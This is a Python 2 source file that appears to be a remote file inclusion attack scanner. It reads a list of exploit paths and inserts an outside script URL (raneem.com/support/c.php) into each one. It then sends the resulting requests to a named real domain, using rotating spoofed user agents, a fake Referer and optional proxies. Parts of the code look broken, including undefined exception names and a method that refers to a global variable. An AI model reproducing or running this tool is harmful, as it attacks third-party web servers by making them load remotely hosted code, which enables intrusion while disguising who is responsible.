import Queue, time, urllib2, random
import threading, socket 

class Pipe:
    def __init__(self, inpipe, outpipe):
        self.inpipe= inpipe
        self.outpipe=outpipe
    
class Request(threading.Thread):
    global headers
    headers=[[('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)')],
        [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')],
        [('User-agent', 'Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)')],
        [("IE 7 Vista","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)")],
        [("Googlebot 2.1","Googlebot/2.1 (http://www.google.com/bot.html)")],
        [("Opera 9 (final) WinXP","Opera/9.00 (Windows NT 5.1; U; en)")],
        [("MSN Bot","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)")],
        [('User-agent', 'Mozilla/5.0 (compatible; MSIE 4.0; Windows NT)')],
        [('User-agent', 'Mozilla/5.0 (compatible; MSIE 5.5; Windows NT)')],
        [('User-agent', 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT)')],
        [("MSIE6 WinXP","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)")]]


    def __init__(self, timer, target, proxy, path, exploit, include):
        threading.Thread.__init__(self)
        self.id = 0
        self.timer = timer
        if isinstance(target,  list) is False:
            self.target = [target]
        else:
            self.target = target
        self.proxy = proxy
        self.directory = path
        if isinstance(exploit,  list) is False:
            self.exploit = [exploit]
        else:
            self.exploit = exploit
        self.include = include
        self.flag= None
        self.stack=[]


    def StartTiming(self):
        return time.time()


    def ConstructUrl(self, target, exploit, directory, include):
        self.exploit = exploit.strip()
        self.target = target
        self.directory = directory
        self.include = include      
        self.exploit=self.exploit.replace('[path]',self.include)
        return 'http://'+self.target+self.directory+self.exploit


    def wget(self, url):
        #proxy syntax => proxy:port
        dfto=socket.getdefaulttimeout()
        socket.setdefaulttimeout(3)
        if self.proxy is None or self.proxy == '':
            opener = urllib2.build_opener()
        else:
            prox = "http://"+self.proxy
            proxies = urllib2.ProxyHandler({"http" : prox})
            opener = urllib2.build_opener(proxies)
        try:
            i = random.randrange(0,6,1)
            opener.addheaders = headers[i]
            urllib2.install_opener(opener)
            try:
                req = urllib2.Request(url)
                req.add_header('Referer', 'www.securynix.com')
                print (url)
                f=urllib2.urlopen(url, timeout=4)
                if f is not None:
                    return  f.read()
                else:
                    return None
                
            except urllib2.httplib.BadStatusLine:
		 raise ("Error reading response")
            except IOError,e:
                return None 
            except URLError,e:
                 return None
            except HTTPError,e:
                 return None            
            finally:
                socket.setdefaulttimeout(dfto)
        except Exception, e:
            raise(str(e))

  
    def scan(self):
         """ E(0..target) --> E(0..exploit) """ 
         for target in self.target:
             for exploit in self.exploit:
                 url=r.ConstructUrl(target, exploit, self.directory, self.include)
                 self.stack.append(url)
       

    def run(self):        
        for url in self.stack:
            print self.stack
            #self.wget(url)



if __name__=="__main__":
    f=open("Gomoz/resources/lists.txt",'r')
    exploits=f.readlines()
    r=Request(0, "nativelabs.org", "", "/", exploits, "http://www.raneem.com/support/c.php")
    r.scan()
    for url in r.stack:
        r.wget(url)
    
    
